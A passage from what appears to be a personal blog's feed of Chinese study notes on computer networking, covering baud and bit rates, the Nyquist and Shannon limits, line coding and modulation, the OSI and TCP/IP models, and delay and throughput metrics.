src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210506222602230.png" alt="image-20210506222602230"></p><h2 id="2-1-3-码元、波特、速率、带宽"><a href="#2-1-3-码元、波特、速率、带宽" class="headerlink" title="2.1.3 码元、波特、速率、带宽"></a>2.1.3 码元、波特、速率、带宽</h2><h3 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h3><p><strong>码元</strong>是指用一个<strong>固定时长</strong>的<strong>信号波形</strong>(数字脉冲)，代表不同离散数值的基本波形，是数字通信中数字信号的计量单位，这个市场内的信号称为K进制码元，而该时长称为码元宽度。当码元的离散状态有M个时(M大于2)，此时码元为M进制码元。</p><p><strong>1码元****可以携带多个比特的信息量</strong>。例如，在使用二进制编码时，只有俩种不同的码元，一种代表0状态，另一种代表1状态。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507171125682.png" alt="image-20210507171125682"></p><h3 id="速率、波特、带宽"><a href="#速率、波特、带宽" class="headerlink" title="速率、波特、带宽"></a>速率、波特、带宽</h3><p>速率也叫数据率，是指数据的<strong>传输速率</strong>，表示单位时间内传输的数据量。可以用<strong>码元传输速率</strong>和<strong>信息传输速率</strong>表示。</p><p>1）码元传输速率：别名码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数（也可称为<strong>脉冲个数或信号变化的次数</strong>），单位是<strong>波特（Baud）</strong>。1波特表示数字通信系统每秒传输一个码元。这里的码元可以是多进制的，也可以是二进制的，但码元速率与进制数无关。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507171720483.png" alt="image-20210507171720483"></p><p>2）信息传输速率：别名信息速率、比特率等，表示单位时间内数字通信系统传输的二进制码元个数（即比特数），单位是比特/秒（b/s）。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507172109683.png" alt="image-20210507172109683"></p><p>带宽:表示单位时间内从网络中的某一点到另一点所能通过的<strong>“最高数据率”</strong>，常用来表示网络的通信线路所能传输数据的能力。单位b/s。</p><h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507172717307.png" alt="image-20210507172717307"></p><p>码元与进制无关，不用管进制，</p><p>四进制即有四个离散状态，需要用俩个01比特位才能表示四种状态 </p><p>十六进制即有十六个离散状态，需要用四个01比特位才能表示十六种状态</p><p>相差俩个比特位</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507173628361.png" alt="image-20210507173628361"></p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507174311045.png" alt="image-20210507174311045"></p><p>如果用十六进制传输四进制码元</p><p>十六进制本来一个码元对应一个比特，当传输四进制码元时，一个码元就会对应俩个比特，码元传输速率就变成了2400Baud</p><h2 id="2-1-4-奈式准则和香农定理"><a href="#2-1-4-奈式准则和香农定理" class="headerlink" title="2.1.4 奈式准则和香农定理"></a>2.1.4 奈式准则和香农定理</h2><h3 id="失真"><a href="#失真" class="headerlink" title="失真"></a>失真</h3><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507175147481.png" alt="image-20210507175147481"></p><p>影响失真程度的因素：</p><ol><li>码元传输速率</li><li>信号传输距离</li><li>噪声干扰</li><li>传输媒体质量</li></ol><h3 id="失真的一种现象–码间串扰"><a href="#失真的一种现象–码间串扰" class="headerlink" title="失真的一种现象–码间串扰"></a>失真的一种现象–码间串扰</h3><p><strong>码间串扰</strong>：接收端收到的信号波形<strong>失去了码元之间清晰界限</strong>的现象。</p><p><strong>信道带宽</strong>：是信道能通过的最高频率和最低频率之差。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507175723215.png" alt="image-20210507175723215"></p><h3 id="奈式准则-奈奎斯特定理"><a href="#奈式准则-奈奎斯特定理" class="headerlink" title="奈式准则(奈奎斯特定理)"></a>奈式准则(奈奎斯特定理)</h3><p>奈式准则：在理想低通(无噪声，带宽受限)条件下，为了避免码间串扰，极限码元传输速率位2W Baud</p><p>W是信道带宽，单位是HZ。一般带宽单位是bit/s,在奈式准则和香农定理中单位是HZ</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507191653493.png" alt="image-20210507191653493"></p><ol><li>在任何信道中，马原的传输速率是有上限的。若传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的完全正确识别成为不可能。</li><li>信道的频带越宽(即能通过的信号高频分量越多)，就可以用更高的速率进行码元的有效传输。</li><li>奈式准则给出了码元传输速率的限制，但是没有对信息传输速率进行限制。</li><li>由于码元传输速率受奈式准则制约，所以要提高数据的传输速率，就必须设法使每个码元携带更多的比特的信息量，这就需要采用多元制的调制方法。</li></ol><h4 id="一道奈式准则练习题"><a href="#一道奈式准则练习题" class="headerlink" title="一道奈式准则练习题"></a>一道奈式准则练习题</h4><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507191827885.png" alt="image-20210507191827885"></p><h3 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h3><p><strong>噪声</strong>存在于所有的电子设备和通信信道中。由于噪声随机产生，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声影响相对较小。因此，<strong>信噪比</strong>就很重要。</p><p>信噪比=<strong>信号</strong>的平均功率/<strong>噪声</strong>的平均功率，常记为<strong>S/N</strong>，并用分贝（<strong>dB</strong>）作为度量单位，即：</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507192250125.png" alt="image-20210507192250125"></p><p>香农定理：在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率吧有上限值。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507192927594.png" alt="image-20210507192927594"></p><ol><li>信道的<strong>带宽</strong>或信道中的<strong>信噪比</strong>越大，则信息的极限传输速率就<strong>越高</strong>。</li><li>对一定的传输带宽和一定的信噪比，信息传输速率的上限就确定了。</li><li>只要信息的传输速率低于信道的极限传输速率，就一定能找到某种方法来实现<strong>无差错的传输</strong>。</li><li>香农定理得出的为极限信息传输速率，实际信道能达到的传输速率要比它低不少。</li><li>从香农定理可以看岀，若信道带宽W或信噪比S/N没有上限（不可能），那么信道的极限信息传输速率也就没有上限。</li></ol><h4 id="一道香农定理练习题"><a href="#一道香农定理练习题" class="headerlink" title="一道香农定理练习题"></a>一道香农定理练习题</h4><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507193532657.png" alt="image-20210507193532657"></p><h3 id="“Nice”和“香浓”"><a href="#“Nice”和“香浓”" class="headerlink" title="“Nice”和“香浓”"></a>“Nice”和“香浓”</h3><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507194217384.png" alt="image-20210507194217384"></p><p>如果同时出现V(几种码元/码元的离散电平数目)和信噪比，我们需要俩种公式都计算，选比较小的</p><h2 id="2-1-5-编码与调制-1"><a href="#2-1-5-编码与调制-1" class="headerlink" title="2.1.5 编码与调制(1)"></a>2.1.5 编码与调制(1)</h2><h3 id="基带信号和宽带信号"><a href="#基带信号和宽带信号" class="headerlink" title="基带信号和宽带信号"></a>基带信号和宽带信号</h3><p><strong>信道</strong>：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道。</p><p>信道按<strong>传输信号</strong>分位<strong>模拟信道(传送模拟信号)<strong>和</strong>数字信道(传送数字信号)<strong>；按</strong>传输介质</strong>分为<strong>有线信道</strong>和无线信道</p><p>信道上传送的信号：</p><ul><li><p>基带信号</p><p>将数字0和1直接用俩种不同的电压表示，再送到<strong>数字信道</strong>上去传输(<strong>基带传输</strong>)。</p><p><strong>来自信源</strong>的信号，像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是发出了<strong>要直接表达信息的信号</strong>，比如我们说话的声波就是基带信号。</p></li><li><p>宽带信号</p><p>将基带信号进行调制后形成的频分复用的模拟信号，再传送到<strong>模拟信道</strong>上去传输(<strong>宽带传输</strong>)。</p><p>将基带信号经过<strong>载波调制</strong>后，把信号的<strong>频率范围搬移</strong>到<strong>较高的频段</strong>以便在信道中传输(即仅在一段频率范围内能够通过信道)</p></li></ul><p>在传输距离较<strong>近</strong>时，计算机网络采用<strong>基带传输</strong>方式（近距离衰减小，从而信号内容不易发生变化）。</p><p>在传输距离较<strong>远</strong>时，计算杋网络采用<strong>宽带传输</strong>方式（远距离衰减大，即使信号变化大也能最后过滤出来基带信号）。</p><h3 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h3><p>总览</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507201358277.png" alt="image-20210507201358277"></p><h2 id="2-1-6-编码与调制-2"><a href="#2-1-6-编码与调制-2" class="headerlink" title="2.1.6 编码与调制(2)"></a>2.1.6 编码与调制(2)</h2><h3 id="数字数据编码为数据信号"><a href="#数字数据编码为数据信号" class="headerlink" title="数字数据编码为数据信号"></a>数字数据编码为数据信号</h3><ol><li><p><strong>非归零编码【NRZ】</strong></p></li><li><p><strong>曼彻斯特编码</strong></p></li><li><p><strong>差分曼彻斯特编码</strong></p></li><li><p>归零编码【RZ】</p></li><li><p>反向不归零编码【NRZI】</p></li><li><p>4B/5B编码</p></li></ol><p>非归零编码和归零编码：</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507202222572.png" alt="image-20210507202222572"></p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507202037333.png" alt="image-20210507202037333"></p><p>全0/1就会是一条直线</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507202115416.png" alt="image-20210507202115416"></p><p>处于低电平情况多且时间久，此信道并没有充分使用</p><hr><p>反向不归零编码：</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507202442417.png" alt="image-20210507202442417"></p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507202426169.png" alt="image-20210507202426169"></p><p>对于全0他会一直翻转，但是对于全1他会是一条直线</p><hr><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507203702011.png" alt="image-20210507203702011"></p><p>曼彻斯特编码：</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507203348009.png" alt="image-20210507203348009"></p><p>差分曼彻斯特编码：</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507203812861.png" alt="image-20210507203812861"></p><p>4B/5B编码：</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507203956806.png" alt="image-20210507203956806"></p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507204037671.png" alt="image-20210507204037671"></p><h3 id="数字数据调制为模拟信号"><a href="#数字数据调制为模拟信号" class="headerlink" title="数字数据调制为模拟信号"></a>数字数据调制为模拟信号</h3><p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。</p><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507204724526.png" alt="image-20210507204724526"></p><p>4*4=16种码元</p><p>log 2 16=4bit→1码元</p><p>1200*4=4800b/s</p><h3 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h3><p>计算机内部处理的是二进制数据，处理的都是<strong>数字音频</strong>，所以需要将模拟音频通过采样、量化转换成有限个数字表示的离散序列（即实现<strong>音频数字化</strong>）。</p><p>最典型的例子就是对音频信号进行编码的脉码调制（PCM），在计算机应用中，能够达到<strong>最髙保真水平</strong>的就是PCM编码，被广泛用于素材保存及音乐欣赏，CD、DVD以及我们常见的WAV文件中均有应用，它主要包括三步：抽样、量化、编码。</p><ol><li>抽样：对模拟信号周期性扫描，把时间上连续的信号变成时间上离散的信号。为了使所得的离散信号能无失真地代表被抽样的模拟数据，要使用采样定理进行采样：f采样频率≥2f信号最高频率</li><li>量化：把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值，并取整数，这就把连续的电平幅值转换为离散的数字量。</li><li>编码：把量化的结果转换为与之对应的二进制编码。</li></ol><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507214302361.png" alt="image-20210507214302361"></p><h3 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h3><p>为了实现传输的有效性，可能需要较高的频率。这种调制方式还可以使用频分复用技术，充分利用带宽资源。在电话杋和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式；模拟的声音数据是加载到模拟的载波信号中传输的。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/06/ji-suan-ji-wang-luo-3/image-20210507220223685.png" alt="image-20210507220223685"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-2(第一章)</title>
      <link href="/2021/05/04/ji-suan-ji-wang-luo-2/"/>
      <url>/2021/05/04/ji-suan-ji-wang-luo-2/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-2"><a href="#计算机网络-2" class="headerlink" title="计算机网络-2"></a>计算机网络-2</h1><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504154555341.png" alt="image-20210504154555341"></p><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504155029153.png" alt="image-20210504155029153"></p><h2 id="1-2-2-OSI参考模型-1"><a href="#1-2-2-OSI参考模型-1" class="headerlink" title="1.2.2 OSI参考模型(1)"></a>1.2.2 OSI参考模型(1)</h2><h3 id="OSI参考模型"><a href="#OSI参考模型" class="headerlink" title="OSI参考模型"></a>OSI参考模型</h3><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504155327754.png" alt="image-20210504155327754"></p><h3 id="OSI参考模型解释通信过程"><a href="#OSI参考模型解释通信过程" class="headerlink" title="OSI参考模型解释通信过程"></a>OSI参考模型解释通信过程</h3><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504160505709.png" alt="image-20210504160505709"></p><h2 id="1-2-3-OSI参考模型-2-各层功能及协议"><a href="#1-2-3-OSI参考模型-2-各层功能及协议" class="headerlink" title="1.2.3 OSI参考模型(2) 各层功能及协议"></a>1.2.3 OSI参考模型(2) 各层功能及协议</h2><h3 id="应用层-用户与网络的界面"><a href="#应用层-用户与网络的界面" class="headerlink" title="应用层-用户与网络的界面"></a>应用层-用户与网络的界面</h3><p>所有能和用户交互产生网络流量的程序</p><p>典型的应用层服务: </p><ul><li>文件传输(FYP)</li><li>电子邮件(SMTP)</li><li>万维网(HTTP)</li><li>…</li></ul><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理在俩个通信系统中交换信息的表达方式(语法和语义)</p><ul><li><p><strong>功能一</strong>：数据格式交换  翻译官</p><p>…0100011101….→  我们所理解的</p></li><li><p><strong>功能二</strong>:数据加密解密</p><p>我的支付密码是xxxx</p></li><li><p><strong>功能三</strong>：数据的压缩和恢复</p></li></ul><p>主要协议:JPEG、ASCll</p><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供<strong>建立连接</strong>并在连接上<strong>有序</strong>的<strong>传输数据</strong></p><p>这是会话，也是建立同步(SYN)</p><ul><li>功能一：建立、管理、中止会话</li><li>功能二：使用校验点可使绘画在通信失效时从<strong>校验点/同步点</strong>继续恢复通信，实现数据同步。   适用于传输大文件</li></ul><p>主要协议：ADSP、ASP</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中<strong>俩个进程</strong>的通信，即<strong>端到端</strong>通信。传输单位是报文段或用户数据报</p><ul><li><p>功能一：可靠传输、不可靠传输</p></li><li><p>功能二：差错控制</p></li><li><p>功能三：流量控制</p><p>控制发送方的发送速率</p></li><li><p>功能四：复用分用</p><p>复用：多个应用层进程可同时使用下面运输层的服务</p><p>分用：运输层把收到的信息分别交付给上面应用层中相应的进程</p></li></ul><p>主要协议：TCP、UDP</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>主要任务是把<strong>分组</strong>从源端传到目的端，为分组交换网上不同的主机提供通信服务。传输单位是<strong>数据报</strong>。</p><ul><li><p>功能一：路由选择</p><p>最佳路径</p></li><li><p>功能二：流量控制</p><p>协调发送端和接收端的速度问题</p></li><li><p>功能三：差错控制</p></li><li><p>功能四：拥塞控制</p><p>若所有结点都来不及接受分组，而要丢弃大量分组的话，网络就处于拥塞状态。因此要采取一定措施，缓解这种拥塞。</p></li></ul><p>主要协议：IP、IPX、ICMP、IGMP、ARP、RARP、OSPF</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要任务是把网络层传下来的数据报组装成帧。</p><p>传输单位为帧。</p><ul><li>功能一：成帧（定义帧的开始和结束）…100001101010101</li><li>功能二：差错控制   <strong>帧错+位错</strong></li><li>功能三：流量控制</li><li>功能四：访问（接入）控制  <strong>控制对信道的访问</strong></li></ul><p>主要协议：SDLC、HDLC、PPP、STP</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在<strong>物理媒体</strong>上实现比特流的<strong>透明传输</strong>。</p><p>传输单位是比特。</p><p><strong>透明传输</strong>：指不管所传数据是什么样的比特组合，都应当能够在链路上传送。</p><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504171007741.png" alt="image-20210504171007741"></p><ul><li><p>功能一：定义接口特性</p></li><li><p>功能二：定义传输模式  <strong>单工、半双工、双工</strong></p><p><strong>单工</strong>：只可以单方向发送，发送端和接收端已经定义好了</p><p><strong>半双工</strong>：俩个人都可以作为发送方和接收方，但是同一时间还是只能一个         人发送信息。</p><p> <strong>双工</strong>：俩个人可以双向同时说话</p></li><li><p>功能三：定义传输速率</p></li><li><p>功能四：比特同步</p></li><li><p>功能五：比特编码</p></li></ul><p>主要协议：Rj45、802.3</p><h2 id="1-2-4-TCP-IP参考模型和五层参考模型"><a href="#1-2-4-TCP-IP参考模型和五层参考模型" class="headerlink" title="1.2.4 TCP/IP参考模型和五层参考模型"></a>1.2.4 TCP/IP参考模型和五层参考模型</h2><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504171839446.png" alt="image-20210504171839446"></p><p>OSI先理论再实践</p><p>TCP/IP先诞生协议栈再把协议栈分层为参考模型</p><h3 id="OSI参考模型和TCP-IP参考模型异同"><a href="#OSI参考模型和TCP-IP参考模型异同" class="headerlink" title="OSI参考模型和TCP/IP参考模型异同"></a>OSI参考模型和TCP/IP参考模型异同</h3><p>相同点：</p><ol><li>都分层</li><li>都基于独立的协议栈的概念</li><li>都可以实现异构网络的互联</li></ol><p>不同点：</p><ol><li><p>OSI定义三点：服务、协议、接口。</p></li><li><p>OSI先出现，参考模型先于协议发明，不偏向特定协议。</p></li><li><p>TCP/IP设计之初就考虑到异构网互联问题，将IP作为重要层次。</p></li><li><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504173704053.png" alt="image-20210504173704053"></p><p><strong>面向连接</strong>分为三个阶段，第一是建立连接，在此阶段，发出一个建立连接的请求。只有在连接成功建立之后，才能开始数据传输，这是第二阶段。接着，当数据传输完毕，必须释放连接。而面向<strong>无连接</strong>没有这么多阶段，它直接进行数据传输。</p></li></ol><h3 id="五层参考模型-综合了OSI和TCP-IP的优点"><a href="#五层参考模型-综合了OSI和TCP-IP的优点" class="headerlink" title="五层参考模型-综合了OSI和TCP/IP的优点"></a>五层参考模型-综合了OSI和TCP/IP的优点</h3><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504174620806.png" alt="image-20210504174620806"></p><h3 id="五层参考模型的数据封装和解封装"><a href="#五层参考模型的数据封装和解封装" class="headerlink" title="五层参考模型的数据封装和解封装"></a>五层参考模型的数据封装和解封装</h3><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504174852347.png" alt="image-20210504174852347"></p><h2 id="第一章总结"><a href="#第一章总结" class="headerlink" title="第一章总结"></a>第一章总结</h2><p><img src="/2021/05/04/ji-suan-ji-wang-luo-2/image-20210504175302542.png" alt="image-20210504175302542"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-1(第一章)</title>
      <link href="/2021/05/03/ji-suan-ji-wang-luo-1/"/>
      <url>/2021/05/03/ji-suan-ji-wang-luo-1/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-1"><a href="#计算机网络-1" class="headerlink" title="计算机网络-1"></a>计算机网络-1</h1><span id="more"></span><h2 id="1-1-1概念、-组成、功能和分类"><a href="#1-1-1概念、-组成、功能和分类" class="headerlink" title="1.1.1概念、   组成、功能和分类"></a>1.1.1概念、   组成、功能和分类</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>计算机网络：是一个将分散的、具有独立功能的计算机系统，通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统。</p><p>计算机网络是互连的、自治的计算机集合。<br>互连-互联互通  通信链路  </p><p>自治-无主从关系</p><h3 id="计算机网络的功能："><a href="#计算机网络的功能：" class="headerlink" title="计算机网络的功能："></a>计算机网络的功能：</h3><ol><li><strong>数据通信</strong>（连通性）</li><li><strong>资源共享</strong>  硬件  软件  数据</li><li>分布式处理  多台计算机各自承担同一工作任务的不同部分</li><li>提高可靠性  替代机</li><li>负载均衡  各计算机之间更亲密</li></ol><h3 id="计算机网络的组成"><a href="#计算机网络的组成" class="headerlink" title="计算机网络的组成"></a>计算机网络的组成</h3><p>1.组成部分  硬件、软件、协议</p><p>2.<strong>工作方式</strong></p><p>边缘部分 用户直接使用：c/s方式、p2p方式</p><p>核心部分  为边缘部分服务</p><p>3.<strong>功能组成</strong></p><p>通讯子网  实现数据通信</p><p>资源子网  实现资源共享/数据处理</p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503140820357.png" alt="image-20210503140820357"></p><h3 id="计算机网路的分类"><a href="#计算机网路的分类" class="headerlink" title="计算机网路的分类"></a>计算机网路的分类</h3><p>1.按分布范围划分</p><p>交换技术 ↓                            广播技术↓</p><p>广域网WAN  城域网MAN  局域网WAN  个人区域网PAN</p><p>2.按使用者划分</p><p>公用网：中国电信等</p><p>专用网：军队、政府</p><p>3.按交换技术分</p><p>电路交换 报文交换  分组交换</p><p>4.按拓补结构分</p><p>总线型  星型  环型  网状型(常用于广域网)</p><p>5.按传输技术分</p><p>广播式网络：共享公共通信信道</p><p>点对点网络：使用<strong>分组存储转发</strong>和<strong>路由共享</strong>机制</p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503141845971.png" alt="image-20210503141845971"></p><h2 id="1-1-2标准化工作及相关组织"><a href="#1-1-2标准化工作及相关组织" class="headerlink" title="1.1.2标准化工作及相关组织"></a>1.1.2标准化工作及相关组织</h2><h3 id="标准的分类"><a href="#标准的分类" class="headerlink" title="标准的分类"></a>标准的分类</h3><p>法定标准  由权威机构制定的正式的、合法的标准 OSI</p><p>事实标准  某些公司的产品在竞争中占据了主流，时间长了，这些产品中的协议和技术就成了标准  TCP/IP</p><h3 id="标准化工作"><a href="#标准化工作" class="headerlink" title="标准化工作"></a>标准化工作</h3><p>RFC-因特网标准的形式</p><p>RFC要上升为因特网标准的四个阶段：</p><ol><li>因特网草案  这个阶段还不是RFC文档</li><li>建议标准  从这个阶段开始是RFC文档</li><li>草案标准 IETF、IAB组织审核</li><li>因特网标准</li></ol><h3 id="标准化工作的相关组织"><a href="#标准化工作的相关组织" class="headerlink" title="标准化工作的相关组织"></a>标准化工作的相关组织</h3><p><strong>国际标准化组织 ISO</strong>  OSI参考模型、HDLC协议</p><p>国际电信联盟 ITU    制定通信规则 </p><p>国际电气电子工程师协会 IEEEE  学术机构、IEEEE802系列标准、5G</p><p>Internet工程师任务组 IETF 负责因特网相关标准的制定 RFC xxxx</p><h2 id="1-1-3性能指标之数据、带宽、吞吐量"><a href="#1-1-3性能指标之数据、带宽、吞吐量" class="headerlink" title="1.1.3性能指标之数据、带宽、吞吐量"></a>1.1.3性能指标之数据、带宽、吞吐量</h2><p>速率即<strong>数据率</strong>或称数据传输率或<strong>比特率</strong>。</p><p>比特  1/0 位</p><p>连接在计算机网络上的主机在数字信道上传送数据位数的速率</p><p>单位是：b/s, kb/s, Mb/s, Gb/s, Tb/s</p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503155531096.png" alt="image-20210503155531096"></p><h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><p>（1）“带宽”<strong>原本</strong>指某个信号具有的频带宽度，即最高频率与最低频率之差，单位是赫兹（Hz）。</p><p>（2）<strong>计算杋网络中，带宽用来表示网络的通信线路传送数据的能力</strong>，通常是指单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。单位是“比特每秒”，b/5s，kb/s，Mb/s，Gb/s。</p><p><strong>网络设备所支持的最高速度</strong></p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503161207107.png" alt="image-20210503161207107"></p><p>带宽影响的是发送给速率，对传播速率没有影响</p><p>eg：影响的是母鸡下蛋的速度，不影响鸡蛋孵化的速度</p><h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><p>吞吐量表示在单位时间内通过某个网络（或信道、接口）的数据量。单位b/s，kb/s，Mb/s等。<br>吞吐量受网络的带宽或网络的额定速率的限制。</p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503182348336.png" alt="image-20210503182348336"></p><p>吞吐量=把所有的链路加和</p><h2 id="1-1-4性能指标之时延、时延带宽积、往返时间RTT、利用率"><a href="#1-1-4性能指标之时延、时延带宽积、往返时间RTT、利用率" class="headerlink" title="1.1.4性能指标之时延、时延带宽积、往返时间RTT、利用率"></a>1.1.4性能指标之时延、时延带宽积、往返时间RTT、利用率</h2><h3 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h3><p>指数据（报文/分组/比特流）从网络（或链路）的一端传送到另一端所需的时间。也叫延迟或迟延。单位是s</p><p>时延分为：<strong>发送时延(传输时延)、传播时延、排队时延、处理时延</strong>。</p><p><strong>发送时延</strong>：从发送分组的第一个比特算起，到分组的最后一个比特发送完毕所需要的时间。<br>$$<br>发送时延=数据长度/信道带宽(发送速率)<br>$$<br><strong>传播时延</strong>：取决于电磁波传播速度和链路长度<br>$$<br>传播时延=信道长度/电磁波在信道上的传播速率<br>$$<br><strong>排队时延</strong>：等待输出/入链路可用</p><p><strong>处理时延</strong>：检错  找出口</p><p>高速链路指的是发送速率快，说的并不是传播速率</p><p>如果求总时延，题目如果都考虑到，则需要全部加起来。</p><h3 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h3><p>$$<br>时延带宽积(bit)=传播时延(s)*带宽(b/s)<br>$$</p><p>时延带宽积又称为以比特为单位的链路长度。</p><p>即 某现在链路有多少比特</p><p>描述的是链路当中此时此刻的数据容量</p><h3 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h3><p>从发送方发送数据开始，到发送方收到接收方的确认（接收方收到数据后立即发送确认），总共经历的时延。</p><p>RTT越大，在收到确认之前，可以发送的数据越多</p><p>RTT包括：往返传播时延=传播时延*2    ；末端处理时间</p><p>RTT不包括传输时延(把数据从主机放到信道)，只管信道上的时间</p><h3 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h3><p>利用率包括：信道利用率；网络利用率<br>$$<br>信道利用率=有数据通过的时间/(有+无)数据通过的时间<br>$$</p><p>$$<br>网络利用率=信道利用率加权平均值<br>$$</p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503185731738.png" alt="image-20210503185731738"></p><h2 id="1-2-1分层结构、协议、接口、服务"><a href="#1-2-1分层结构、协议、接口、服务" class="headerlink" title="1.2.1分层结构、协议、接口、服务"></a>1.2.1分层结构、协议、接口、服务</h2><h3 id="为什么要分层？"><a href="#为什么要分层？" class="headerlink" title="为什么要分层？"></a>为什么要分层？</h3><p>比如：发送文件前要完成的工作<br>（1）发起通信的计算机必须将数据通信的通路进行激活<br>（2）要告诉网络如何识别目的主机。<br>（3）发起通信的计算机要查明目的主机是否开机，并且与网络连接正常。<br>（4）发起通信的计算杋要弄清楚，对方计算机中文件管理程序是否已经做好准备工作。<br>（5）确保差错和意外可以解决。……等</p><p>他会存在很多问题，所以要把这个大问题分成很多小问题来解决</p><h3 id="怎么分层？"><a href="#怎么分层？" class="headerlink" title="怎么分层？"></a>怎么分层？</h3><p>协议    服务   接口</p><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503191253943.png" alt="image-20210503191253943"></p><h3 id="正式认识分层结构"><a href="#正式认识分层结构" class="headerlink" title="正式认识分层结构"></a>正式认识分层结构</h3><p><img src="/2021/05/03/ji-suan-ji-wang-luo-1/image-20210503191947986.png" 